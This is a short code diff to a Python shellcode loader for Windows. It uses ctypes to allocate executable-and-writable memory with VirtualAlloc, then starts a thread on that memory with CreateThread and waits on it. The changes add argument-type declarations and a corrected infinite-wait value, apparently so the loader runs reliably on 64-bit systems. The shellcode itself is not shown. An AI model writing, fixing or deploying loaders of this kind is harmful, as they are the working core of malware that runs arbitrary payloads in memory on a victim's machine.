@@ -728,6 +728,13 @@ def main():
         ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
     ]
     kernel32.CreateThread.restype = ctypes.c_void_p
+    kernel32.CreateThread.argtypes = [
+        ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p,
+        ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p,
+    ]
+    kernel32.WaitForSingleObject.argtypes = [
+        ctypes.c_void_p, ctypes.c_ulong,
+    ]
 
     ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
     if not ptr:
@@ -749,7 +756,7 @@ def main():
         print("[-] CreateThread failed", file=sys.stderr)
         sys.exit(1)
 
-    kernel32.WaitForSingleObject(ht, -1)
+    kernel32.WaitForSingleObject(ht, 0xFFFFFFFF)
 
 
 if __name__ == "__main__":
